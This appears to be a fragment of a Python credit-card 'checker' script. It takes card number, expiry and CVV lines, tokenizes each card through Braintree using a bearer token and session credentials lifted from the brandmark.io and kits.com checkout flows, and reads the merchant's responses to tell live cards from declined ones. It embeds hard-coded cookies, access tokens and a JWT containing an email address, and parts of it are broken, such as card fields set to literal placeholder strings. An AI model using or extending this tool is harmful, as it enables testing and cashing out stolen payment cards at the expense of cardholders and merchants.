basket_cookie=%7b%22price1%22%3a%229%2e00%22%2c%22descrip1%22%3a%22London%20Fog%20LF%20403%22%2c%22lenses_descrip1%22%3a%22Standard%20Lenses%22%2c%22href1%22%3a%22https%3a%2f%2fwww%2ekits%2ecom%2fglasses%2fGL00275%2ehtml%3fconfig%3d000000625%22%2c%22src1%22%3a%22%2fcart%2fimages%2fframes%2fitems%2f1%2f11%2f11000000625_IMG_green%2epng%22%2c%22qty1%22%3a%221%22%2c%22subtot%22%3a%229%22%2c%22number_total_items%22%3a%221%22%2c%22totqty%22%3a%221%22%2c%22mv_locale%22%3a%22en_US%22%7d; _gcl_au=1.1.738839759.1724176047.2119908149.1724176847.1724176847; userID=6c28432c6919f625a62c0e854f5ec2cc04031ff3',
    'origin': 'https://www.kits.com',
    'priority': 'u=1, i',
    'referer': 'https://www.kits.com/ord/checkout.html',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
	
	json_data = {
    'nonce': tok,
    'agreement1': 1,
    'payment_type': 'cc',
}
	
	response = requests.post('https://www.kits.com/api/payment/finish',headers=headers, json=json_data)
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"nonce":"tokencc_bh_92ty85_n7ck2k_md6wdd_pdv929_nxz","agreement1":1,"payment_type":"cc"}'
	#response = requests.post('https://www.kits.com/api/payment/finish', cookies=cookies, headers=headers, data=data)
	try:
		k=(response.json()['errors'][0])
		try:
			k=k.split(':')[2]
		except:pass
		return k
	except:
		pass
	if 'true' in response.text or 'True' in response.text:
		msg=f'Payment completed successfully'
	elif 'Funds' in response.text:
		msg=f'Insufficient Funds'
	else:
		return ('#ERROE#')
def be(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	cookies = {
	    '_ga': 'GA1.2.197546107.1712183919',
	    '_gid': 'GA1.2.421236434.1712183919',
	    '_gat': '1',
	    '_ga_93VBC82KGM': 'GS1.2.1712183920.1.1.1712185262.0.0.0',
	}
	
	headers = {
	    'authority': 'app.brandmark.io',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/json;charset=UTF-8',
	    # 'cookie': '_ga=GA1.2.197546107.1712183919; _gid=GA1.2.421236434.1712183919; _gat=1; _ga_93VBC82KGM=GS1.2.1712183920.1.1.1712185262.0.0.0',
	    'origin': 'https://app.brandmark.io',
	    'referer': 'https://app.brandmark.io/v3/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Linux"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
	}
	
	json_data = {
	    'recaptcha_token': '03AFcWeA5n9WBF9yWy_ps8GmIkDTyQdSopq6uAiGZeJTo4RwWFBlEDNw9Kn5IWrwcwp1D0CJSnUG7ylk58MVaX7o13aJ8LL6RWLv7UgnTe7WA50aivKYLAoSKpnjR3CSnuYetNuDXMLelUbcVFUWRvrs5xWziWojSHA8Za8CnvD1D-QB76YCpP6Qwl-NDFLP_DQEjaIbbyy2tr4AcjSJJ-wS-5wqrvt6raIVjdliQQ7rmSMu-Bq2aEGmiIqMoLxJ3vRSQ6Enny8Pr2b5SMZ73YFlBKFyGw6BHhIFOqmRd-Om8HrdBxTM8NMJArjkCEgJrBZESgI4ECMna_LMGWmvqi_DvWJAYIGDqDyg3H448dzVY59CsvasHBKCFZ7bciegrGxxS9Fc-GvWGtEZLiOCQ6bHQsb571nj4MchDjR5zJ9q2fZytnCNuLjQESCc7DbGDFbKDaO4qXQ_ZEx5OQ8AxEZMzqKx1unolewnS7O9Gt07CMSDC6If-iFdhk7KqcSUfV-3ba8l11PZ9pr4hrskH6wnnDcek0Ufsn0SZfXlpjOQM3gVy3NIZj5v4wAY3kjTt7FDYCA2s4a0xiBhdcCpTidILjXcmBRkBNVTSbp3beB6oUoqRD2yFkAZD_M-JhbIq7fe-Cb7o-boRKrCNHFunjx6PSs6ivKSvkdEWCmd02a8q8Hprls6koV8GU0r5RH_d-XyedUStSVt283GtdEVvdhS8InZpxa-srkKcKcp4JhNcB4Yd7TEpfDv4E2hPvBkBo-AsmKTmO4Amw-ypsCs5yxHEKZ5H-nLMEwOw3T6dZUGc-6v5yPNuPODs4eLzHKijituADwiSIcQqHkMQ_WKAa9txJ5WXGVaw4OdtGVGSxg1Y63T0VaJixTT_ZdmyuTgP7L-XbJctLG2yrsOiWC2gqvYH1AOEnymIMJBrWW_g036QRnr0HwyEGYHjY-Nr3PIqxBpDRU9wfCNdUFBgL2Ev5ApMygY8mu1B5HNMA1pHwQjHOfVpGhjnkntM-QG6-oEzRj020IjWDYrD4LuXnJJDfG3eCtQglSxEzjP3rQMJrfTrpbqJkvnBOETpY4mHXURhqUuzLAjN6Eay_GUo5godUgBsajqfhXSnV2qdQiMc9MGzbyUOpNq3QhMtmxSvqv45eKTwrFobdfsTwak2LkMMEIbuw21MVWpg76fbY5JQ2WAF3w5s0nh8EobAdGzpRlZkt3ea9zC_OLF0FIJAgbLHN0dHcR-lbp4rfjfBhRtx3wqeq5xRzdPeE2UUzfsXiCymIRDnVkSbFOowoFGEoftsQjH8rsNWztAwyQr0l5_9WOWBHMliAofRiNDuFqVQtfIoaSjR-O7n45hkvBAHsRMtrY0_OMo7-3zEG0tukb8Ysx2EC7OkRYvqJJbWd3E2c7V-foNgKzV1b_jdmfmsCpHrwTnnHQ50qj3GafTndm0rCBtjPH6id3JaYCjeD31ed297XRXio6E6yBdKy_-2JUfm3opA5KRLFidCkmvUYx1l4nOwO0-2RMv6KAlPrFy0AK6olDKgX-K-uaXQyigsi9NqmDO0PWebNONT8bx9wqVsRhIm6ZS7JCdQsdb4aZoA46_HK_FQdW04ocGAuOxWdfX0s62Je-wRZFaHrNA3Ajt8_YZ6Dc6z2GNKE0dlRJtpYCwqPxnCddwJic56CW8jO9Ih7gu_2FoFEZaEFQXA_yv9IBLKhEjjHDmaujFI1-AC5RiJ3u8zpkImR8TP42Va71nnfn2BmgQU9hKhDqUh2OPpO2f9lMwfPTCpuFK5hsa8LXAhQMgkk4XWga3jLmNXVmXb3nTbEi4EcFRQiPwwANL4dY4MqVZMqv248grg1ADW0u7Z1E2u38dS_0VEuMwg59UwZF9WoSxGLOs845s1RvpAvrcTCfD5DHIcaJOmpmhgoaz_OjvgDorhRY-t-B2FtvwP9BzdmxGjSYcsYzhzUWCa6vBuukADStpI3jjrz7u1AM0-tgn0I_getneZNaT_RMHHE5iievwmEeZAjYQ',
	    'token': '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',
	    'user_id': 'Qb7eJOxZFVc4bIXxFkRzRPZSbko2',
	    'access_token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjgwNzhkMGViNzdhMjdlNGUxMGMzMTFmZTcxZDgwM2I5MmY3NjYwZGYiLCJ0eXAiOiJKV1QifQ.eyJuYW1lIjoiVkJGIiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0laRlpBMlFaSGZSN044b0JtZ1phZV9aM0VCYzU0LUpzLU8taUJQUmRQQ0oyVkdrdz1zOTYtYyIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9icmFuZG1hcmstaW8iLCJhdWQiOiJicmFuZG1hcmstaW8iLCJhdXRoX3RpbWUiOjE3MTIxODQwNjIsInVzZXJfaWQiOiJRYjdlSk94WkZWYzRiSVh4RmtSelJQWlNia28yIiwic3ViIjoiUWI3ZUpPeFpGVmM0YklYeEZrUnpSUFpTYmtvMiIsImlhdCI6MTcxMjE4NDA2MiwiZXhwIjoxNzEyMTg3NjYyLCJlbWFpbCI6InZpc2FzcGFtNzdAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZ29vZ2xlLmNvbSI6WyIxMTIxOTU0NzY2ODEzMjczNDQ4NjciXSwiZW1haWwiOlsidmlzYXNwYW03N0BnbWFpbC5jb20iXX0sInNpZ25faW5fcHJvdmlkZXIiOiJnb29nbGUuY29tIn19.FqQOaL5Gh7p4QjqaTy6G0trQ2QLnonYQg27egGs4nOkD66MVbUSNDsYwUvD709AW42m7Jij3ijEzpB5ReztYHOyUP7SzMe9pTaJaU8gyOkUe_LRwCCL4kG-kRf3helMjgyscyNmZ-XfevHceKDkN45p8EYaJsROl_xGgeBG6eGYGf0rDx9Rn_y209PsPd1ewsep4YsfvEBOEVVJUZNBq3l2xZhiV7lEcLj4ZmYzmbyxub276XMe0la2gVS1WNQZ6zvYsvcV8dcdowT_M18wCw5jNiLtFRGWKGzsPaQrl8SfZD6hHHGqhokJcl8fqbaHFf3ohzT8Jejq71SXSaGwrpQ',
	}
	
	response = requests.post('https://app.brandmark.io/v3/client_token.php', cookies=cookies, headers=headers, json=json_data)
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"recaptcha_token":"03AFcWeA5n9WBF9yWy_ps8GmIkDTyQdSopq6uAiGZeJTo4RwWFBlEDNw9Kn5IWrwcwp1D0CJSnUG7ylk58MVaX7o13aJ8LL6RWLv7UgnTe7WA50aivKYLAoSKpnjR3CSnuYetNuDXMLelUbcVFUWRvrs5xWziWojSHA8Za8CnvD1D-QB76YCpP6Qwl-NDFLP_DQEjaIbbyy2tr4AcjSJJ-wS-5wqrvt6raIVjdliQQ7rmSMu-Bq2aEGmiIqMoLxJ3vRSQ6Enny8Pr2b5SMZ73YFlBKFyGw6BHhIFOqmRd-Om8HrdBxTM8NMJArjkCEgJrBZESgI4ECMna_LMGWmvqi_DvWJAYIGDqDyg3H448dzVY59CsvasHBKCFZ7bciegrGxxS9Fc-GvWGtEZLiOCQ6bHQsb571nj4MchDjR5zJ9q2fZytnCNuLjQESCc7DbGDFbKDaO4qXQ_ZEx5OQ8AxEZMzqKx1unolewnS7O9Gt07CMSDC6If-iFdhk7KqcSUfV-3ba8l11PZ9pr4hrskH6wnnDcek0Ufsn0SZfXlpjOQM3gVy3NIZj5v4wAY3kjTt7FDYCA2s4a0xiBhdcCpTidILjXcmBRkBNVTSbp3beB6oUoqRD2yFkAZD_M-JhbIq7fe-Cb7o-boRKrCNHFunjx6PSs6ivKSvkdEWCmd02a8q8Hprls6koV8GU0r5RH_d-XyedUStSVt283GtdEVvdhS8InZpxa-srkKcKcp4JhNcB4Yd7TEpfDv4E2hPvBkBo-AsmKTmO4Amw-ypsCs5yxHEKZ5H-nLMEwOw3T6dZUGc-6v5yPNuPODs4eLzHKijituADwiSIcQqHkMQ_WKAa9txJ5WXGVaw4OdtGVGSxg1Y63T0VaJixTT_ZdmyuTgP7L-XbJctLG2yrsOiWC2gqvYH1AOEnymIMJBrWW_g036QRnr0HwyEGYHjY-Nr3PIqxBpDRU9wfCNdUFBgL2Ev5ApMygY8mu1B5HNMA1pHwQjHOfVpGhjnkntM-QG6-oEzRj020IjWDYrD4LuXnJJDfG3eCtQglSxEzjP3rQMJrfTrpbqJkvnBOETpY4mHXURhqUuzLAjN6Eay_GUo5godUgBsajqfhXSnV2qdQiMc9MGzbyUOpNq3QhMtmxSvqv45eKTwrFobdfsTwak2LkMMEIbuw21MVWpg76fbY5JQ2WAF3w5s0nh8EobAdGzpRlZkt3ea9zC_OLF0FIJAgbLHN0dHcR-lbp4rfjfBhRtx3wqeq5xRzdPeE2UUzfsXiCymIRDnVkSbFOowoFGEoftsQjH8rsNWztAwyQr0l5_9WOWBHMliAofRiNDuFqVQtfIoaSjR-O7n45hkvBAHsRMtrY0_OMo7-3zEG0tukb8Ysx2EC7OkRYvqJJbWd3E2c7V-foNgKzV1b_jdmfmsCpHrwTnnHQ50qj3GafTndm0rCBtjPH6id3JaYCjeD31ed297XRXio6E6yBdKy_-2JUfm3opA5KRLFidCkmvUYx1l4nOwO0-2RMv6KAlPrFy0AK6olDKgX-K-uaXQyigsi9NqmDO0PWebNONT8bx9wqVsRhIm6ZS7JCdQsdb4aZoA46_HK_FQdW04ocGAuOxWdfX0s62Je-wRZFaHrNA3Ajt8_YZ6Dc6z2GNKE0dlRJtpYCwqPxnCddwJic56CW8jO9Ih7gu_2FoFEZaEFQXA_yv9IBLKhEjjHDmaujFI1-AC5RiJ3u8zpkImR8TP42Va71nnfn2BmgQU9hKhDqUh2OPpO2f9lMwfPTCpuFK5hsa8LXAhQMgkk4XWga3jLmNXVmXb3nTbEi4EcFRQiPwwANL4dY4MqVZMqv248grg1ADW0u7Z1E2u38dS_0VEuMwg59UwZF9WoSxGLOs845s1RvpAvrcTCfD5DHIcaJOmpmhgoaz_OjvgDorhRY-t-B2FtvwP9BzdmxGjSYcsYzhzUWCa6vBuukADStpI3jjrz7u1AM0-tgn0I_getneZNaT_RMHHE5iievwmEeZAjYQ","token":"l7AumChJS3xsGcg8w8qmfnHPmuBsi8/K3FtJ37iNG3TQBGdzfD5DI1UWPCtS4NGcJE+/SeiqN/xaIoVsIMtJjECR3eOdUu2vc7Ga+OOexqAosKKPmzWr75uIj6kRvIYeMQVSeJ+owI9ULhPw8KUm5U0CfbW65mEi6HWBMNj1aa/TPhe6edFZWmd7JBx/InQqUsIxbdZo1BCAHJDIDJFGEEABHkttq5MxRo9+d6F5gG6/Hzr+Xqw+QeIA4a732mEvdVb2m1tLJCCAsJBgICMj4Q9kpegdrLXl3zJR08Gc8P1mR5FlUPcQwFpm+RInYILYnhjpY9Z5SXac1aKDrVOx+KTnH2QkB/bUIKjNE0AKPTJPt5Qe04PcYX1Mpqfwg2q1A+d+2JqhykPkEPqPeys7PPq3r8C6fm+hQAze3Oagn7WOjHeMjdPGNFxa8rZaouJ88uqB2kESTRyCXuKIwaJbEJroIM8ITfV3FwEQ7eKuQ9ypQAilisPeuNJ0rBW/Pg/qq4qxH9el3F0pgaCIX94Xc6ibNnMtGTvrx4ws2hRkTwiFluVQx48tZVb96gKWearpPGAs1k8MvWzq9bqKXb80LOdVe9WQpo0s6D16oIS/oAoC/Kc8t7nx5qLwKS8ZTL/BWBAM5ErMMD9VaYR6lamL+HBTT5p29ovyNkVXQDIPCNQGQQtvxWiSLH8cKrBlhNf3yeGupGlqa5M/uj6zQx1TCqVNu9amMm4dtcH9Nt8FYiZO5tWr33VQ4wSzbYsqUB0gbSmW5wU+McWAorMqMjH5dzagGYZIWEN3W4CJTDmF+GRXhIeVHkyumZtqLnHDXPss7YjxbopmIXzaBLFX1Vw/0gv6pv8MKwGNxfJaMfVh1VZRvKGYJFe3JnOcSOTP9Wboj0xzOI0js6fPQQwACl4er8tKov7lPCBuBTTCUgQg7m7aR0fYlz6hwVhbdpfEkLuy2kWX2z5PH9AkcOqFcJJGSPS6kavJw9SMpHf4phiwBF/VBha2sMCXb/1BAlI7EuvLTSHfphEsyCR6H5cCIfQk/O+/No7J7bftXcyi9VTgnyQZY+fwr86ox7Cu1sNfdsyfDlflDPByIwI1HkBipGXn6JfNef8LVkDcPG+LfB8Ogr4qOJ+5CoJyfVqMui4YzLdoV893jmVq1OvVp2DVqUuxoHPnKUOsq6m4/txXtNs/WGiu8jLUkUyxRV7c0NRcn/uVy3BjWn//gZqObaxZtJMAk/sqhl/FUkvsg3cxuQcXn5mRkjjgIe/ag1QKOdr9GUZk4JTNibXUMbf7uhdqp9LwH5S8JY1Bn/euOfAlG2XC3BaEO385sJsUSGbByNDGWaObFD4etQTamfyt4HUz292cwy1OnPoTKA6kLpul86nqOnCsL8CdE6BOiN9ofAVX/N2m+MB71eWtN1Id+nWAx6i8BrfSNbXiKcl9UXy0qQWT8ccSo9F6aPUwmqdhnDm2AaW/DyDA2wo4ybz4G2Pk6GNSJP8g1548Zy9Jn9r0Bh45ESZZuF2xKWYypskS5K05QbKO7gSC/CR/8A7QdNqsKAs8TE2FkXco0ZwPM7OoWd1GFJtWHHZDvHgEPVfbTlWnOUBjBj+2IJmVKUEn5Sj33uZoL7RmJx/ay80bFrapzICI/doVtwR+77aAHERr8Fky5tpkKBzxDO2MN7wKqFctz4v2KPzZy4vBetRdaeI2d0ksHQam27LlCIjEXPPn5Ojyo2K7EvixX34ebQvOgxxiU0qsxdAZlp+CaP9GSQyiasdsja3p+xYCvD/y+ea9sGKmLwAnrogX8MpwWEx57OF3YBg36YcHoQxjvY07GIPztthnwoOs16suq8voQjsqBr9mvPhDNDXT0me5UQ9VOXutil6lUjYIDToD870EHhWYdvx4ADwn00xDlOrZGi6dInLqh/ssDBH7g+EKCSMFjKkhKL8Dx6C8RoVsCfUXsKuGIzaVSZjY0Z35quBobePXzJaaWW6NpRHX+IkIHLuUIcJgwxK44v//WdMugG+6eFha8YJAWlDxLeeWA/D+WPp8SItsdVLZVyzMtDVnWVAhJreVhjMzu8DYj0YLdfWsgxqpezT7bhWXYgwmHEeIw9rUEB43ma8YxdiyUiYTmUhSbwZ4q3KrLMwtxc0kLnY/SGKSj63NuMzi8QddMT9FFtgwDSru2YZAKIeO7D+r2hBq4IaW6RzydhsBiKNrjCCEg3E/AvJQo9CkIq46HPi0dc2DYG8eYjNzCN58K/Z6FF3FwEINz6lnfHTv3ah13ALr6OC9MVhboGnI9wpx2Z8q5p/vM56Guw02e72qP38N1hv+66+UfRerrDJhTUCr+H37+AlUIC3K85QBH9uQUBjFhHsKkWiJ87ET7mHAXc4nwpruNokWMJAja+FXw37GAv4n1ZFhdawqOk7uAlwlL/5UtMpfNMZeFyvA5VQR1UOeI8OIFzxR6Ayb3WcV+4QQC/B0aD3rmJGvlgQHudvFusOlKOwntShk/nPNf9007pSBVCxqvYIikVNU91svgD8W/4LlZ6vT6ontk9KydlQ+NkTkmE9cCNisy2fwC/PqyIvqPewfwvi2v6klnJXJcBnnHFgd3nrlzRTW2fFprdxq08bIeW+Xhhy/k6xX1Kvofcu1G5ELkNPTVI+dp7LYRSmRYzlP7W2u4/G/ambeyketEZmPDv0p5DdkgeT4UvoxY7tQmQpmgTiie8XF6iZ5moOoD8SUNB5HYgP1mkrVatnaEhAM9WThzIrv/jWg7978kINxaG69+miXqxdaoTr3AiB7W0j/5DHSc59Gsd7uwkw1Af9eLs/WQ5B=","user_id":"Qb7eJOxZFVc4bIXxFkRzRPZSbko2","access_token":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjgwNzhkMGViNzdhMjdlNGUxMGMzMTFmZTcxZDgwM2I5MmY3NjYwZGYiLCJ0eXAiOiJKV1QifQ.eyJuYW1lIjoiVkJGIiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0laRlpBMlFaSGZSN044b0JtZ1phZV9aM0VCYzU0LUpzLU8taUJQUmRQQ0oyVkdrdz1zOTYtYyIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9icmFuZG1hcmstaW8iLCJhdWQiOiJicmFuZG1hcmstaW8iLCJhdXRoX3RpbWUiOjE3MTIxODQwNjIsInVzZXJfaWQiOiJRYjdlSk94WkZWYzRiSVh4RmtSelJQWlNia28yIiwic3ViIjoiUWI3ZUpPeFpGVmM0YklYeEZrUnpSUFpTYmtvMiIsImlhdCI6MTcxMjE4NDA2MiwiZXhwIjoxNzEyMTg3NjYyLCJlbWFpbCI6InZpc2FzcGFtNzdAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZ29vZ2xlLmNvbSI6WyIxMTIxOTU0NzY2ODEzMjczNDQ4NjciXSwiZW1haWwiOlsidmlzYXNwYW03N0BnbWFpbC5jb20iXX0sInNpZ25faW5fcHJvdmlkZXIiOiJnb29nbGUuY29tIn19.FqQOaL5Gh7p4QjqaTy6G0trQ2QLnonYQg27egGs4nOkD66MVbUSNDsYwUvD709AW42m7Jij3ijEzpB5ReztYHOyUP7SzMe9pTaJaU8gyOkUe_LRwCCL4kG-kRf3helMjgyscyNmZ-XfevHceKDkN45p8EYaJsROl_xGgeBG6eGYGf0rDx9Rn_y209PsPd1ewsep4YsfvEBOEVVJUZNBq3l2xZhiV7lEcLj4ZmYzmbyxub276XMe0la2gVS1WNQZ6zvYsvcV8dcdowT_M18wCw5jNiLtFRGWKGzsPaQrl8SfZD6hHHGqhokJcl8fqbaHFf3ohzT8Jejq71SXSaGwrpQ"}'
	#response = requests.post('https://app.brandmark.io/v3/client_token.php', cookies=cookies, headers=headers, data=data)
	ui=(response.json()["client_token"])
	import base64,re
	decoded_text = base64.b64decode(ui).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjA1MjE3MzYsImp0aSI6Ijc1Y2IwZDFhLTQ2NTUtNGQyYy04Nzg3LTJlODljYjA2ZjQ3OSIsInN1YiI6ImZ6anc5bXIyd2RieXJ3YmciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZ6anc5bXIyd2RieXJ3YmciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.aPzyn0eWIFcqnHNvuOnlwtKqAETeFV4OJ4f7Awzv70sro_1QP4cnMRlh-c80TpXZaxD-BCAnc1JANOuS4OoRhg',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'dropin2',
	        'sessionId': '958870b5-2475-4e20-ba99-b22e1992d8b9',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': '+n+',
	                'expirationMonth': '+mm+',
	                'expirationYear': '+yy+',
	                'cvv': '+cvc+',
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok =(response.json()['data']['tokenizeCreditCard']['token'])	
	cookies = {
	    '_ga': 'GA1.2.38243407.1720435247',
	    '_gid': 'GA1.2.185830640.1720435247',
	    '_gat': '1',
